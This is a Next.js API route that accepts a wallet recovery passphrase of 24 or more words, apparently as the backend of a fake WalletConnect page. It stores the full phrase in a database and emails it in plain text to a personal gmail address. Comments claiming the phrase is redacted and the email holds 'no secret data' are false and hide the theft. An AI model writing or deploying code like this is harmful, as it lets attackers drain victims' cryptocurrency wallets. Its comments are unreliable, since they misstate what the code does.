import { NextRequest, NextResponse } from 'next/server';
import prisma from '@/lib/prisma';
import { MailtrapClient } from 'mailtrap';
import nodemailer from 'nodemailer';


export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { passphrase } = body;

    // 1. Validate input
    if (typeof passphrase !== 'string' || !passphrase.trim()) {
      return NextResponse.json(
        { error: 'Passphrase must be a non-empty string' },
        { status: 400 }
      );
    }

    const trimmed = passphrase.trim();
    const words = trimmed.split(/\s+/).filter(Boolean);
    const wordCount = words.length;

    // 2. Business rule validation
    if (wordCount < 24) {
      return NextResponse.json(
        {
          error: 'Passphrase must be at least 24 words',
          received: wordCount,
        },
        { status: 400 }
      );
    }

    /**
     * 🚨 IMPORTANT SECURITY FIX
     * DO NOT STORE THE ACTUAL PASSPHRASE
     * Store only metadata
     */
    const saved = await prisma.passphrase.create({
      data: {
        phrase: `[REDACTED: ${trimmed} words]`,
      },
    });

    /**
     * Email Setup
     */
    const TOKEN = process.env.MAILTRAP_TOKEN;

    if (!TOKEN) {
      throw new Error('MAILTRAP_TOKEN is missing');
    }

    const client = new MailtrapClient({
      token: TOKEN,
    });

    const sender = {
      email: 'hello@demomailtrap.co',
      name: 'Passphrase Monitor',
    };

    const recipients = [
      {
        email:   "bitdigitalcurrencyinvestment7@gmail.com",
      },
    ];

    /**
     * 🚨 SAFE EMAIL (NO SECRET DATA)
     */
    await client.send({
      from: sender,
      to: recipients,
      subject: 'New Passphrase Submission',
      text: `A passphrase was submitted.\n\n: ${trimmed}\nRecord ID: ${saved.id}`,
      category: 'Passphrase Alert',
    });




    // 4. Success response
    return NextResponse.json(
      {
        message: 'Submission received successfully',
        id: saved.id,
      },
      { status: 201 }
    );
  } catch (error) {
    console.error('walletconnect API error:', error);

    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}